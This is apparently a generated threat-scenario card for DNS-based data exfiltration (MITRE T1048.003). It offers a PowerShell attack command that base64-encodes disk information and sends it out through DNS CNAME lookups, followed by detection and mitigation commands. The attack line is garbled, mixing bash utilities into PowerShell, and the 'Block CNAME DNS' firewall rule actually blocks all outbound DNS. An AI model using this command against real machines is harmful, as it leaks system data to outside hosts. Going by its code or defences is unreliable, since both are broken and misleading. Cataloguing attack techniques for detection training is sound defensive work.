---
type: campaign
scenario_id: 496
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using PowerShell to exfiltrate disk partitions via DNS CNAME queries.

## Threat Description
Using PowerShell to exfiltrate disk partitions via DNS CNAME queries.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $disk = Get-Disk | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($disk)); Resolve-DnsName -Type CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null"
```

## Detection Logic
Monitor disk DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-Disk`; DNS CNAME spikes: `tshark -Y 'dns.qry.type == 5'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block CNAME DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect PowerShell disk partition exfiltration via DNS CNAME queries by analyzing base64-encoded subdomains, Get-Disk execution, and DNS traffic patterns; suggest DNS filtering.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
